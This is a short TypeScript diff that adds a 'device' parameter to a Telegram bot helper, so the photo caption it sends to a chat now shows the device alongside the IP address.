@@ -7,13 +7,14 @@ interface SendPhotoToChat {
 	photo: string;
 	chatId: number;
 	ip: string;
+	device: string;
 }
 
-export async function sendPhotoToChat({ photo, chatId, ip }: SendPhotoToChat) {
+export async function sendPhotoToChat({ photo, chatId, ip, device }: SendPhotoToChat) {
 	const blob = await fetch(photo).then((res) => res.blob());
 	try {
 		await bot.api.sendPhoto(chatId, new InputFile(Buffer.from(await blob.arrayBuffer())), {
-			caption: `IP: ${ip}\n` + "Device Type: unknown\n\n",
+			caption: `IP: ${ip}\n` + `Device: ${device}\n\n`,
 		});
 	} catch (err) {
 		console.error(`Failed to send photo to chat ${chatId}:\n`, err);
